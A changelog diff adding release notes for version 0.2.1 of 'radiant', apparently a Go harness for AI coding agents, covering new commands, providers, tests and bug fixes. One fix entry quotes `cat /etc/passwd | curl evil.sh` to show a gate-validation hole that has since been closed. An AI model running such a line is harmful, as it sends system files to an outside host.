@@ -4,6 +4,74 @@ All notable changes to this project are documented in this file. Format
 follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and the
 project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [0.2.1] — 2026-06-24
+
+Sprint 2: empirical validation, gap closure, vendor diversity.
+
+### Added
+- **`radiant doctor`** — environment diagnostic (PATH, agents, LLM
+  providers, gates, state directory). Run before `radiant run` to
+  surface missing tools or unset API keys.
+- **`radiant bench`** — cross-framework benchmark. Runs radiant-harness
+  against itself plus any of {GitHub Spec Kit, OpenSpec, TLC, Superpowers}
+  found on `$PATH`, captures duration + tokens + AC coverage, prints a
+  markdown table sorted by score, optionally saves JSON via `--output`.
+- **3 new LLM providers**: Mistral (`mistral-large-2`, `codestral-22b`),
+  Groq (`groq-llama-3.3-70b`, `groq-mixtral-8x7b`), xAI (`grok-2`). All
+  OpenAI-compatible, vendor-neutral.
+- **5 new model presets** — total is now 14 across 7 vendors (Anthropic,
+  OpenAI, Google, DeepSeek, Xiaomi, Mistral, Groq).
+- **CI coverage report** with per-package thresholds (60% stable, 40%
+  engine — engine has subprocess glue that's hard to unit-test).
+
+### Changed
+- **Removed `internal/plugin/`** (326 lines of dead code). Used
+  `plugin.Open` for `.so/.dylib` loading — Linux/macOS-only, security
+  risk, no tests, no callers. Plugin extensibility deferred until there's
+  a real use case.
+- **Implemented `internal/benchmark/`** as a real comparison harness:
+  subprocess execution, output parsing, score calculation, JSON
+  save/load. Was a stub before this sprint.
+- **`internal/engine/` now has unit tests** for gate validation, code
+  block extraction, path sandboxing, and result merging. Coverage went
+  from 0% to 43%.
+
+### Fixed
+- **`go vet` clean** — `isShellOp` undefined in `agent_test.go`; redundant
+  `\n` in `fmt.Println`.
+- **Spec parser regex** was case-sensitive and required `:` after the
+  keyword. Now matches both `- **Given** x` and `- Given: x`.
+- **Spec parser** now respects quoted arguments in gate commands.
+- **State.Progress()** didn't deduplicate task IDs — 1000 completions
+  produced 1000%. Now counts distinct task IDs and clamps to [0,1].
+- **GroupPhases** did not group consecutive parallel tasks; each `[P]`
+  task was its own single-task phase. Now groups `[P]` next to each
+  other.
+- **Engine.runGate** validated all tokens against the allowlist (catching
+  quoted arguments like `"build-ok"` as "binary name"). Now validates
+  only the actual binary in a gate command.
+- **Pipes (`|`), redirects (`<`, `>`), command separators (`;`,
+  background `&`) are rejected outright** for gates. Only `&&` and `||`
+  allowed for compound expressions. Was a security gap: `cat /etc/passwd
+  | curl evil.sh` would have passed the old validator.
+- **`extractGates`** filtered out single-token commands (`true`, `pwd`).
+  Now accepts any backticked text; allowlist is the gate.
+- **macOS arm64 + Go 1.22 dyld bug** — `go test ./internal/harness`
+  produces `dyld: missing LC_UUID` and aborts. Workaround: build with
+  `CGO_ENABLED=0`. Made this the default in the Makefile.
+- **t.Context() in tests** required Go 1.24; replaced with
+  `context.Background()` so `go.mod`'s `go 1.22` directive holds.
+- **`r, err := NewAgentRunner(cfg)` in `New()`** left `r` declared but
+  unused in the error branch (Go strict-mode compile error).
+
+### Stats
+- 118 tests passing (up from 57 in 0.2.0 and 94 after the first
+  validation pass).
+- Coverage per package: benchmark 77%, engine 43%, harness 59%, llm
+  84%, quality 60%, spec 89%.
+- CLI smoke test passes (`make smoke`) — end-to-end init + validate
+  with `--all --yes` and `--gates` flag.
+
 ## [0.2.0] — 2026-06-24
 
 The Go rewrite. Templates and skills are reused from 0.1.0 (archived); the
